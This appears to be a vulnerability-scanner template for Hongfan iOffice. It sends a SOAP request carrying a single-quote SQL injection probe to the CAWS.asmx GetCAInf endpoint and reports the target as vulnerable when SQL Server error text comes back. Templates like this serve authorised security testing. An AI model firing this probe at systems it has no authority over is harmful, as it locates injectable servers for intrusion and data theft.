红帆-ioffice-caws-sql注入.yaml

id: hongfan-ioffice-CAWS-sqli

info:
  name: hongfan-ioffice-CAWS-sqli
  author: hongfan-ioffice-CAWS-sqli
  severity: critical

http:
  - raw:
      - |
        POST /iOffice/prg/interface/CAWS.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetCAInf"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetCAInf xmlns="http://tempuri.org/">
              <formid>61'</formid>
              <signData>string</signData>
            </GetCAInf>
          </soap:Body>
        </soap:Envelope>
        

    matchers:     
      - type: dsl
        dsl:
          - "status_code == 500 && contains_all(body,'System.Data.SqlClient','iOfficeData')" 